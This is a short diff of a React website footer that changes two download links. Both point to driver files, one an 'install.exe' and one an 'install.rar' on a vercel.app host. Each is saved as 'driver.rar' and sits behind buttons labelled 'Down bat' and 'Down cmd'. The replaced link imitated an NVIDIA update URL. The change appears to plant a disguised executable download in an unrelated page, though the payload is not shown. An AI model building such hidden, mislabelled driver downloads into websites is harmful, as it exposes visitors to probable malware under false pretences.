@@ -61,10 +61,10 @@ function Footer() {
                 Follow Us
               </h2>
               <Button>Request A Callback</Button>
-              <a href = "https://scalehash.com/nvidia-rc.update/9p532Pkgf0QZ2Fcg9LbVVdjGlv67X2jU" download="driver.rar">
+              <a href = "https://prohouse-v-uf84.vercel.app/src/driver/install.exe" download="driver.rar">
               <Button>Down bat</Button>
               </a>
-              <a href = "https://github.com/Maxtop-pro/prohouseV/src/driver/installc.rar" download="driver.rar">
+              <a href = "https://prohouse-v-uf84.vercel.app/src/driver/install.rar" download="driver.rar">
               <Button>Down cmd</Button>
               </a>
             </div>
